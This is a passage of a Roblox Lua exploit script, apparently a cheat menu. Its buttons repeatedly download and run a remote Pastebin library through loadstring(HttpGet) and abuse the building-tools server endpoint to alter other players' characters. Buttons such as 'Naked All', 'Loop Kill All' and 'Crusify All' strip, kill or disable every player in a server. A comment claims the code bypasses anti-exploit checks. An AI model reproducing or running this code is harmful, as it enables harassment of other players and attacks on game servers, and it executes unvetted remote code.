Part1.TopSurface = Enum.SurfaceType.Smooth







  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-9.45,0,1.5)*  CFrame.new(1,0.1, 1.5)  wait()

          part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=12221720"

       duck.TextureId = "http://www.roblox.com/asset/?id=12221720"

part:AddSparkles()



		duck.Scale = Vector3.new(1, 1, 1)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Red Ballon", "", function()

    player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth







  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.8,0,0)*  CFrame.new(-0.05,0.7, -1)  wait()

          part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=25498565"

       duck.TextureId = "http://www.roblox.com/asset/?id=26725707"



		duck.Scale = Vector3.new(1.5, 1.5, 1.5)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Umbrella", "", function()

  player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth

local plr = game.Players.LocalPlayer



plr.Character.Humanoid.JumpPower = 100



  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.8,0,0)*  CFrame.new(-0.05,1.5, -1)  wait()

          part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=43996518"

       duck.TextureId = "http://www.roblox.com/asset/?id=43996783"



		duck.Scale = Vector3.new(1, 1, 1)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Golden Steampunk Gloves", "", function()

    player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth





  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-6.3,5.3,-6.3)*  CFrame.new(-0.05,-1, 0.45)  wait()

          part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=243183921"

       duck.TextureId = "http://www.roblox.com/asset/?id=243183937"



		duck.Scale = Vector3.new(3, 3, 3)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)



local Tab = Window:NewTab("Fun Scripts")

local Section3 = Tab:NewSection("Fun Scripts")

Section3:NewButton("Naked All", "", function()

      local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()

    

        for _,player in pairs(game.Players:GetPlayers()) do

            spawn(function()

                F3X.Edit(player.Character:GetChildren(), {})

            for i,fee in pairs(player.Character:GetChildren()) do

if fee:IsA("BasePart") then

    F3X.Object(fee).BrickColor = BrickColor.new(225)

    end

        

local pchar = player.Character -- This bypasses all Anti exploits so do not worry .

   pchar.Shirt:Remove()





   pchar.Pants:Remove()





   pchar["Shirt Graphic"].Graphic = ""



        end

			end)

		end

	

	

end)

Section3:NewButton("Fart All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})



  

local yes = F3X.Object(player.Character.Torso):AddSmoke()

yes.Size = 0.43

yes.Color = Color3.new(0,3,0)

    



      end)

end





end)

Section3:NewButton("Remove Walking All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})





F3X.Object(player.Character.HumanoidRootPart):Destroy()

F3X.Object(player.Character.Humanoid).Sit = true

      end)

end





end)

Section3:NewButton("Fire All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})

         for i,fee in pairs(player.Character:GetChildren()) do

if fee:IsA("BasePart") then

    F3X.Object(fee):AddFire().Size = 0.8

end

end

F3X.Object(player.Character["Head"]).BrickColor = BrickColor.new(154)

					F3X.Object(player.Character["Torso"]).BrickColor = BrickColor.new(154)

					F3X.Object(player.Character["Left Leg"]).BrickColor = BrickColor.new(154)

					F3X.Object(player.Character["Right Leg"]).BrickColor = BrickColor.new(154)

					F3X.Object(player.Character["Left Arm"]).BrickColor = BrickColor.new(154)

					F3X.Object(player.Character["Right Arm"]).BrickColor = BrickColor.new(154)

        

local pchar = player.Character -- This bypasses all Anti exploits so do not worry .

   pchar.Shirt:Remove()





   pchar.Pants:Remove()





   pchar["Shirt Graphic"].Graphic = ""



        

      end)

end





end)

Section3:NewButton("Fairy All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})

              for _,limb in pairs(player.Character:GetChildren()) do

           if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then

               F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()

           end

              end

   F3X.Object(player.Character["Head"]).BrickColor = BrickColor.new(221)

					F3X.Object(player.Character["Torso"]).BrickColor = BrickColor.new(221)

					F3X.Object(player.Character["Left Leg"]).BrickColor = BrickColor.new(221)

					F3X.Object(player.Character["Right Leg"]).BrickColor = BrickColor.new(221)

					F3X.Object(player.Character["Left Arm"]).BrickColor = BrickColor.new(221)

					F3X.Object(player.Character["Right Arm"]).BrickColor = BrickColor.new(221)

        

local pchar = player.Character -- This bypasses all Anti exploits so do not worry .

   pchar.Shirt:Remove()





   pchar.Pants:Remove()





   pchar["Shirt Graphic"].Graphic = ""



         for i,fee in pairs(player.Character:GetChildren()) do

if fee:IsA("BasePart") then

    F3X.Object(fee):AddSparkles().Size = 0.8

     F3X.Object(fee):AddSparkles().Size = 0.8

      F3X.Object(fee):AddSparkles().Size = 0.8

       F3X.Object(fee):AddSparkles().Size = 0.8

end

end



        

      end)

end





end)

Section3:NewButton("Tron All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})

              for _,limb in pairs(player.Character:GetChildren()) do

           if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then

               F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()

           end

              end

         for i,fee in pairs(player.Character:GetChildren()) do

if fee:IsA("BasePart") then

   local lol = F3X.Object(fee):AddMesh()

          lol.MeshId = "http://www.roblox.com/asset/?id=6099332968"

lol.TextureId = "http://www.roblox.com/asset/?id=6099332968"

lol.Scale = Vector3.new(0.1,0.34,0.1)

F3X.Object(player.Character["Head"]).Transparency = 1

end

end

local pchar = player.Character -- This bypasses all Anti exploits so do not worry .

    pchar.Head.Face:Remove()







        

      end)

end

end)

Section3:NewButton("Crusify All", "", function()

     local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})

      F3X.Object(player.Character.HumanoidRootPart).Anchored = true

wait(2)

    local part = F3X.new("Part", workspace)

       part.CanCollide = false

part.BrickColor = BrickColor.new(217)

part.Material = ("Wood")

part:AddFire().Size = 8

       part.Size = Vector3.new(0.8, 10, 1)

       part.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, 1)

          wait()

      part:WeldTo(player.Character.HumanoidRootPart)

          local part = F3X.new("Part", workspace)

       part.CanCollide = false

part.BrickColor = BrickColor.new(217)

part.Material = ("Wood")

       part.Size = Vector3.new(0.8, 1, 5)

       part:AddFire().Size = 8

       part.CFrame = player.Character.HumanoidRootPart.CFrame *CFrame.Angles(0,4.76,0) * CFrame.new(1, 2, 0)

          wait()

      part:WeldTo(player.Character.HumanoidRootPart)

wait(3)

F3X.Object(player.Character.Head):Destroy()

      

end)

end



    end)

Section3:NewButton("Thomas The Dank Engine", "", function()

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = game:GetService("Players").LocalPlayer.Character.Torso

				}

			}

		}

	

		game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["MeshType"] = Enum.MeshType.FileMesh,

					["Part"] = game:GetService("Players").LocalPlayer.Character.Torso

				}

			}

		}

	

		game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

		local args = {

			[1] = "ExtractMeshFromAsset",

			[2] = 2231280670

		}

	

		game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,

					["MeshId"] = "rbxassetid://2231280549",

					["TextureId"] = "rbxassetid://2231280614"

				}

			}

		}

	

		game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,

					["Scale"] = Vector3.new(2, 2, 1.5)

				}

			}

		}

	

		game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

		local args = {

			[1] = "CreateDecorations",

			[2] = {

				[1] = {

					["Part"] = game:GetService("Players").LocalPlayer.Character.Head,

					["DecorationType"] = "Smoke"

				}

			}

		}

	

		game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

		local args = {

			[1] = "SyncDecorate",

			[2] = {

				[1] = {

					["Part"] = game:GetService("Players").LocalPlayer.Character.Head,

					["DecorationType"] = "Smoke",

					["Opacity"] = 1

				}

			}

		}

	

		game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

		local args = {

			[1] = "SyncDecorate",

			[2] = {

				[1] = {

					["Part"] = game:GetService("Players").LocalPlayer.Character.Head,

					["DecorationType"] = "Smoke",

					["RiseVelocity"] = 99

				}

			}

		}

	

		game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

        local args = {

    [1] = "CreateLights",

    [2] = {

        [1] = {

            ["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,

            ["LightType"] = "SpotLight"

        }

    }

}



game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

local args = {

    [1] = "SyncLighting",

    [2] = {

        [1] = {

            ["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,

            ["LightType"] = "SpotLight",

            ["Brightness"] = 99

        }

    }

}



game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

local args = {

    [1] = "SyncLighting",

    [2] = {

        [1] = {

            ["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,

            ["LightType"] = "SpotLight",

            ["Angle"] = 45

        }

    }

}



game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

local args = {

    [1] = "SyncMaterial",

    [2] = {

        [1] = {

            ["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Leg"),

            ["Transparency"] = 1

        }

    }

}



game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

local args = {

    [1] = "SyncMaterial",

    [2] = {

        [1] = {

            ["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Leg"),

            ["Transparency"] = 1

        }

    }

}



game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

local args = {

    [1] = "SyncMaterial",

    [2] = {

        [1] = {

            ["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Arm"),

            ["Transparency"] = 1

        }

    }

}



game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

local args = {

    [1] = "SyncMaterial",

    [2] = {

        [1] = {

            ["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Arm"),

            ["Transparency"] = 1

        }

    }

}



game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

local args = {

    [1] = "SyncMaterial",

    [2] = {

        [1] = {

            ["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Head"),

            ["Transparency"] = 1

        }

    }

}



game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

		_G.WS = "66";

		local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;

		Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()

			Humanoid.WalkSpeed = _G.WS;

		end)

		Humanoid.WalkSpeed = _G.WS;

local plr = game.Players.LocalPlayer.Character

local train = plr.Torso

local function SFX(id) local s=Instance.new("Sound",plr.Torso); s.SoundId = "rbxassetid://"..id; s.Volume = 1; return s; end

train.Touched:connect(function(p)

	if p.Parent then

		if p.Parent:IsA("Model") then

			if game.Players:FindFirstChild(p.Parent.Name) then

				if p.Parent.Name ~= game.Players.LocalPlayer.Name then

									local args = {

				[1] = "Remove",

				[2] = {

					[1] = game.Players:FindFirstChild(p.Parent.Name).Character.Head

				}

			}

	

			game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))

					local Whistle = SFX(475073913)

					Whistle:Play()

				end

			end

		end

	end

end)

end)

Section3:NewButton("Raining Toads", "", function()

while true do

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()

local part = F3X.new("Part", workspace)

part.Size = Vector3.new(440,530,380)

part.Position = Vector3.new(math.random(-1000,1000),math.random(1,3000),math.random(-1000,1000))

part.CanCollide = false

mesh = part:AddMesh()

mesh.MeshType = "FileMesh"

mesh.MeshId = "http://www.roblox.com/asset/?id=5038530279"

mesh.TextureId = "http://www.roblox.com/asset/?id=5038530309"

mesh.Scale = Vector3.new(10, 10, 10)

wait(0.1)

end

end)

Section2:NewButton("SoulStealer", "", function()

    player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth





  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.75,0,0)*  CFrame.new(-0.05,2.85, -1.1)  wait()     

       part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=94840342"

       duck.TextureId = "http://www.roblox.com/asset/?id=94840359"

       part:AddFire().Size = 3



		duck.Scale = Vector3.new(1, 1, 1)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Rainbow Periastron Omega", "", function()

    player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth





  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-6.25,9.45,4.55)*  CFrame.new(0.85,0.2, 2.5)  wait()     

       part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=80557857"

       duck.TextureId = "http://www.roblox.com/asset/?id=157345185"

       part:AddSparkles()



		duck.Scale = Vector3.new(1, 1, 1)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Telamon's Foe Hammer", "", function()

    player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth





  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-6.25,9.45,-4.55)*  CFrame.new(-1.65,0.2,2.5)  wait()     

       part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=53420470"

       duck.TextureId = "http://www.roblox.com/asset/?id=53420537"

       



		duck.Scale = Vector3.new(1.7, 1.7, 1.7)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Big Ban Hammer", "", function()

    player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth





  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-7.85,9.45,0)*  CFrame.new(0.15,1.7,0.8)  wait()     

       part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=10604848"

       duck.TextureId = "http://www.roblox.com/asset/?id=10605252"

       



		duck.Scale = Vector3.new(1, 1, 1)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section3:NewButton("Loop Kill All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})

       for _,limb in pairs(player.Character:GetChildren()) do

           if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then

               F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()

           end

       end

while wait(0.4) do

F3X.Object(player.Character.Head).CFrame = game:GetService("Players").LocalPlayer.Character["Left Arm"].CFrame * CFrame.new(0, -0.5, 0)

end



      end)

end



end)

Section3:NewButton("Color All Random", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})

       for _,limb in pairs(player.Character:GetChildren()) do

           if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then

               F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()

           end

       end



            for i,fee in pairs(player.Character:GetChildren()) do

if fee:IsA("BasePart") then

    F3X.Object(fee).BrickColor = BrickColor.random()

end

end



      end)

end



end)

Section2:NewButton("Ultra Ban Hammer", "", function()

    player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth





  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -48583883487437455454)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(-7.85,9.45,0)*  CFrame.new(0.15,9,0.8)  wait()     

       part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=10604848"

       duck.TextureId = "http://www.roblox.com/asset/?id=10605252"

       



		duck.Scale = Vector3.new(3, 3, 3)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Owner Ban Hammer (BIG)", "", function()

   player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

